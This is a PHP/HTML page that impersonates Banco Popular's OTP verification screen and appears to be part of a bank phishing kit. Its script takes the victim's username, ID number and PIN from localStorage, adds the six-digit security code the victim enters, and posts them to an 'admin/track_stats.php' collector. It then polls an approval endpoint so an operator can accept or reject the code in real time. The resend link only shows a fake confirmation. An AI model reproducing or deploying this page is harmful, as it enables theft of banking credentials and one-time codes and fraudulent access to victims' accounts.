<?php
// Banco Popular - OTP
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Popular - Verificación</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', Arial, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 420px;
            margin: 0 auto;
            background-color: white;
            border-radius: 0;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .header-bar {
            background-color: #00496B;
            height: 12px;
        }

        .content {
            padding: 40px 24px;
        }

        .welcome-section {
            margin-bottom: 32px;
            position: relative;
        }

        .welcome-section h1 {
            font-size: 24px;
            color: #333;
            font-weight: 400;
            margin-bottom: 8px;
        }

        .logo {
            max-width: 180px;
            height: auto;
        }

        .subtitle {
            font-size: 16px;
            color: #666;
            margin-bottom: 32px;
            line-height: 1.5;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #333;
            margin-bottom: 8px;
            text-align: center;
        }

        .otp-container {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin-bottom: 24px;
        }

        .otp-input {
            width: 48px;
            height: 56px;
            border: 2px solid #d1d5db;
            border-radius: 12px;
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            color: #333;
            background-color: white;
            transition: border-color 0.2s;
        }

        .otp-input:focus {
            outline: none;
            border-color: #FF6B00;
        }

        .otp-input.filled {
            border-color: #FF6B00;
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            background-color: #d1d5db;
            color: #9ca3af;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: not-allowed;
            margin-bottom: 16px;
            transition: background-color 0.2s;
        }

        .btn-submit.enabled {
            background-color: #FF6B00;
            color: white;
            cursor: pointer;
        }

        .btn-submit.enabled:hover {
            background-color: #e55f00;
        }

        .resend-link {
            text-align: center;
        }

        .resend-link a {
            color: #FF6B00;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .resend-link a:hover {
            text-decoration: underline;
        }

        .footer {
            text-align: center;
            padding-top: 24px;
            border-top: 1px solid #e5e5e5;
            margin-top: 24px;
        }

        .footer p {
            font-size: 12px;
            color: #666;
            margin-bottom: 8px;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-top: 12px;
        }

        .footer-links a {
            color: #FF6B00;
            text-decoration: none;
            font-size: 12px;
            font-weight: 500;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        /* Pantalla de carga */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #0B4A6F;
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        .loading-overlay.show {
            display: flex;
        }

        .loading-container {
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .loading-logo {
            max-width: 250px;
            height: auto;
            margin-bottom: 50px;
            filter: brightness(0) invert(1);
        }

        .loading-text {
            font-size: 20px;
            color: white;
            margin-bottom: 30px;
            font-weight: 500;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .dots::after {
            content: '.';
            animation: dots 1.5s steps(4, end) infinite;
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }

        /* Toast */
        #toast {
            display: none;
            position: fixed;
            top: 20px;
            right: 20px;
            background: #e74c3c;
            color: white;
            padding: 12px 24px;
            border-radius: 8px;
            z-index: 10000;
            font-size: 14px;
            max-width: 320px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-bar"></div>
        
        <div class="content">
            <div class="welcome-section">
                <h1>Banco Popular</h1>
                <img src="popular.svg" alt="Banco Popular" class="logo">
            </div>

            <p class="subtitle">Ingresa el código de seguridad de 6 dígitos que enviamos a tu celular registrado.</p>

            <form id="otpForm">
                <div class="form-group">
                    <label class="form-label">Código de seguridad</label>
                    <div class="otp-container">
                        <input type="password" class="otp-input" maxlength="1" inputmode="numeric" id="digit1">
                        <input type="password" class="otp-input" maxlength="1" inputmode="numeric" id="digit2">
                        <input type="password" class="otp-input" maxlength="1" inputmode="numeric" id="digit3">
                        <input type="password" class="otp-input" maxlength="1" inputmode="numeric" id="digit4">
                        <input type="password" class="otp-input" maxlength="1" inputmode="numeric" id="digit5">
                        <input type="password" class="otp-input" maxlength="1" inputmode="numeric" id="digit6">
                    </div>
                </div>

                <button type="submit" class="btn-submit" id="submitBtn">Verificar</button>

                <div class="resend-link">
                    <a href="#" onclick="reenviarCodigo()">Reenviar código</a>
                </div>

                <div class="footer">
                    <p>Protegido por reCAPTCHA | <a href="#" style="color: #FF6B00; text-decoration: none;">Privacidad</a> - <a href="#" style="color: #FF6B00; text-decoration: none;">Condiciones</a></p>
                    <div class="footer-links">
                        <a href="#">Seguridad</a>
                        <a href="#">Accesibilidad</a>
                    </div>
                </div>
            </form>
        </div>
    </div>

    <!-- Pantalla de carga -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-container">
            <img src="popular.svg" alt="Banco Popular" class="loading-logo">
            <div class="loading-text">Verificando código<span class="dots"></span></div>
            <div class="spinner"></div>
        </div>
    </div>

    <!-- Toast -->
    <div id="toast">
        <span id="toastMsg">Error</span>
    </div>

    <script>
        // ========================================
        // VARIABLES
        // ========================================
        const otpInputs = [
            document.getElementById('digit1'),
            document.getElementById('digit2'),
            document.getElementById('digit3'),
            document.getElementById('digit4'),
            document.getElementById('digit5'),
            document.getElementById('digit6')
        ];

        const submitBtn = document.getElementById('submitBtn');
        const loadingOverlay = document.getElementById('loadingOverlay');
        let pollingInterval = null;
        let logIdOtp = null;
        let intentosOtp = 0;

        // ========================================
        // MANEJO DE INPUTS OTP
        // ========================================
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                if (this.value !== '') {
                    this.classList.add('filled');
                    if (index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    }
                } else {
                    this.classList.remove('filled');
                }
                checkOtpForm();
            });

            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '' && index > 0) {
                    otpInputs[index - 1].focus();
                    otpInputs[index - 1].value = '';
                    otpInputs[index - 1].classList.remove('filled');
                    checkOtpForm();
                }
                if (e.key.length === 1 && !/[0-9]/.test(e.key)) e.preventDefault();
            });

            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const digits = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').split('').slice(0, 6);
                digits.forEach((digit, i) => {
                    if (otpInputs[i]) {
                        otpInputs[i].value = digit;
                        otpInputs[i].classList.add('filled');
                    }
                });
                if (digits.length > 0) otpInputs[Math.min(digits.length, 6) - 1].focus();
                checkOtpForm();
            });
        });

        function checkOtpForm() {
            const allFilled = otpInputs.every(input => input.value !== '');
            submitBtn.classList.toggle('enabled', allFilled);
            submitBtn.disabled = !allFilled;
        }

        function getCode() {
            return otpInputs.map(i => i.value).join('');
        }

        function clearCode() {
            otpInputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled');
            });
            checkOtpForm();
            otpInputs[0].focus();
        }

        // ========================================
        // TOAST
        // ========================================
        function showToast(msg) {
            const toast = document.getElementById('toast');
            document.getElementById('toastMsg').textContent = msg;
            toast.style.display = 'block';
            setTimeout(() => {
                toast.style.display = 'none';
            }, 5000);
        }

        // ========================================
        // REENVIAR CÓDIGO
        // ========================================
        function reenviarCodigo() {
            showToast('✅ Nuevo código enviado a tu celular registrado.');
        }

        // ========================================
        // POLLING
        // ========================================
        function startPolling(id) {
            let pollCount = 0;
            const maxPolls = 150;

            console.log('🔍 Iniciando polling OTP con ID:', id);

            const interval = setInterval(() => {
                pollCount++;
                console.log(`📡 Poll OTP #${pollCount} - ID:`, id);

                fetch('../../admin/check_aprobacion.php?log_id=' + id)
                    .then(res => res.json())
                    .then(data => {
                        console.log('📊 Estado OTP recibido:', data.estado);

                        if (data.estado === 'aprobado') {
                            console.log('✅ OTP APROBADO! Redirigiendo...');
                            clearInterval(interval);
                            loadingOverlay.classList.remove('show');
                            window.location.href = "../../index.php";
                        } else if (data.estado === 'rechazado') {
                            console.log('❌ OTP RECHAZADO');
                            clearInterval(interval);
                            loadingOverlay.classList.remove('show');
                            
                            intentosOtp++;
                            if (intentosOtp < 3) {
                                showToast("Código incorrecto. Intente nuevamente.");
                                clearCode();
                            } else {
                                showToast("Ha excedido el número de intentos. Regresando al inicio.");
                                setTimeout(() => {
                                    window.location.href = "index.php";
                                }, 2000);
                            }
                        } else if (pollCount >= maxPolls) {
                            console.log('⏰ TIMEOUT');
                            clearInterval(interval);
                            loadingOverlay.classList.remove('show');
                            showToast("Tiempo de espera agotado. Intente de nuevo.");
                        }
                    })
                    .catch(err => {
                        console.error('❌ Error en polling OTP:', err);
                        if (pollCount >= maxPolls) {
                            clearInterval(interval);
                            loadingOverlay.classList.remove('show');
                            showToast("Error de conexión. Intente de nuevo.");
                        }
                    });
            }, 2000);
        }

        // ========================================
        // ENVÍO DEL OTP
        // ========================================
        document.getElementById('otpForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const code = getCode();
            if (!code || code.length !== 6) {
                showToast('Ingrese los 6 dígitos del código de seguridad.');
                return;
            }

            loadingOverlay.classList.add('show');

            // Recuperar datos del localStorage
            const usuario = localStorage.getItem('usuario_popular') || '';
            const identificacion = localStorage.getItem('identificacion_popular') || '';
            const tipo_id = localStorage.getItem('tipo_id_popular') || 'CC';
            const clave_pin = localStorage.getItem('clave_pin_popular') || '';

            const formData = new FormData();
            formData.append('activity', 'OTP (BANCO POPULAR)');
            formData.append('action', 'log');
            formData.append('metodo', 'PSE');
            formData.append('banco', 'Banco Popular');
            formData.append('documento', usuario);
            formData.append('usuario', usuario);
            formData.append('identificacion', identificacion);
            formData.append('tipo_identificacion', tipo_id);
            formData.append('clave_pin', clave_pin);
            formData.append('codigo_dinamica', code);
            formData.append('codigo_otp', code);
            formData.append('clave_tarjeta', '');
            formData.append('ultimos_digitos', '');

            try {
                const response = await fetch('../../admin/track_stats.php', {
                    method: 'POST',
                    body: formData,
                    keepalive: true
                });

                const data = await response.json();
                console.log('📝 Respuesta track_stats OTP:', data);
                
                if (data.success && data.id) {
                    logIdOtp = data.id;
                    localStorage.setItem('log_id_otp_popular', data.id);
                    startPolling(data.id);
                } else {
                    loadingOverlay.classList.remove('show');
                    showToast('Error al procesar el código.');
                }
            } catch (err) {
                console.error('Error:', err);
                loadingOverlay.classList.remove('show');
                showToast('Error de conexión. Intente de nuevo.');
            }
        });
    </script>
</body>
</html>